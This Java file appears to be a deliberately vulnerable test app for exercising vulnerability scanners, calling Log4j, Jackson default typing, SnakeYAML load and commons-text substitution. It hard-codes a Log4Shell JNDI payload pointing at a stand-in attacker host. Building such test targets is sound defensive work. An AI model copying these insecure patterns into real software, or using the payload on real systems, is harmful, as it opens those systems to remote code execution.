package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.yaml.snakeyaml.Yaml;
import org.apache.commons.text.StringSubstitutor;
import java.util.HashMap;
import java.util.Map;

/**
 * Vulnerable Java Application
 * 
 * This application intentionally uses vulnerable dependencies for testing
 * vulnerability scanning tools.
 * 
 * DO NOT USE IN PRODUCTION!
 */
public class App {
    // Vulnerable: Log4j 2.14.1 - CVE-2021-44228 (Log4Shell)
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        System.out.println("Vulnerable Java Application Started");
        
        // Vulnerable: Log4Shell - JNDI injection via log message
        String userInput = "${jndi:ldap://attacker.com/exploit}";
        logger.info("User input: " + userInput);
        
        // Vulnerable: Jackson deserialization
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(); // Dangerous!
            String json = "{\"name\":\"test\"}";
            Map<String, Object> result = mapper.readValue(json, HashMap.class);
            System.out.println("Parsed: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // Vulnerable: SnakeYAML arbitrary code execution
        Yaml yaml = new Yaml();
        String yamlContent = "name: test";
        Object obj = yaml.load(yamlContent);
        System.out.println("YAML loaded: " + obj);
        
        // Vulnerable: Text4Shell - CVE-2022-42889
        Map<String, String> valuesMap = new HashMap<>();
        valuesMap.put("name", "World");
        StringSubstitutor sub = new StringSubstitutor(valuesMap);
        String template = "Hello, ${name}!";
        String result = sub.replace(template);
        System.out.println(result);
    }
}
